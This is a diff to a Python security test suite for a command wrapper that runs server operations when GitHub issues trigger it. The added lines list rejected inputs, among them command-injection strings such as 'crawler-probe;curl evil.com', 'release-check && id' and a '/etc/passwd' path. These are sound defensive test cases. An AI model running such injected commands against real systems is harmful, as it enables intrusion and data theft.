@@ -8,12 +8,13 @@ import unittest
 ROOT = Path(__file__).resolve().parents[2]
 WRAPPER = ROOT / "ops/server/ca-ops-command"
 BOOTSTRAP = ROOT / "ops/server/bootstrap.sh"
+UPGRADE = ROOT / "ops/server/upgrade.sh"
 WORKFLOW = ROOT / ".github/workflows/controlled-server-ops.yml"
 
 
 class ServerOpsSecurityTests(unittest.TestCase):
     def test_shell_syntax(self):
-        for script in (WRAPPER, BOOTSTRAP):
+        for script in (WRAPPER, BOOTSTRAP, UPGRADE):
             with self.subTest(script=script.name):
                 subprocess.run(["bash", "-n", str(script)], check=True)
 
@@ -21,6 +22,8 @@ class ServerOpsSecurityTests(unittest.TestCase):
         for command in (
             "", "bash", "/bin/sh", "sudo id", "status;id",
             "tests;id", "test", "status\nwhoami", "deploy", "crawler-import",
+            "feed-audit;id", "feed-audit --path /etc/passwd",
+            "crawler-probe;curl evil.com", "release-check && id", "crawler-sync",
         ):
             with self.subTest(command=command):
                 proc = subprocess.run(
@@ -36,6 +39,8 @@ class ServerOpsSecurityTests(unittest.TestCase):
         self.assertIn("github.event.issue.user.id == 343900642", yaml_text)
         self.assertIn("github.event.issue.title == 'CA-OPS: status'", yaml_text)
         self.assertIn("github.event.issue.title == 'CA-OPS: tests'", yaml_text)
+        for operation in ("feed-audit", "crawler-probe", "release-check"):
+            self.assertIn("github.event.issue.title == 'CA-OPS: " + operation + "'", yaml_text)
         self.assertIn("github.repository == 'Coco1the8creator7/bewerbungs-agent'", yaml_text)
         self.assertIn("permissions:\n  contents: read", yaml_text)
         self.assertNotIn("pull_request_target:", yaml_text)
@@ -59,6 +64,16 @@ class ServerOpsSecurityTests(unittest.TestCase):
         self.assertNotIn("workflow_dispatch:", wrapper)
         self.assertNotIn("systemctl reload", wrapper)
         self.assertNotIn("reset --hard", wrapper)
+        self.assertNotIn("--commit-test-db", wrapper)
+        self.assertNotIn("psycopg", wrapper)
+        self.assertNotIn("systemctl restart", wrapper)
+        self.assertIn("expected_sha=1fdff1b1c17feb21332c83bce66bb262788eb370", wrapper)
+        self.assertIn("git -C \"$workdir/repo\" rev-parse HEAD", wrapper)
+        self.assertIn("timeout 60s python3 -m crawler.yousty_probe", wrapper)
+        self.assertIn("python3 /usr/local/lib/careeragency-ops/feed_audit.py", wrapper)
+        self.assertIn("cmp -s", wrapper)
+        self.assertNotIn("sudo ", "\\n".join(line for line in wrapper.splitlines()
+                                           if not line.lstrip().startswith("#")))
 
 
 if __name__ == "__main__":
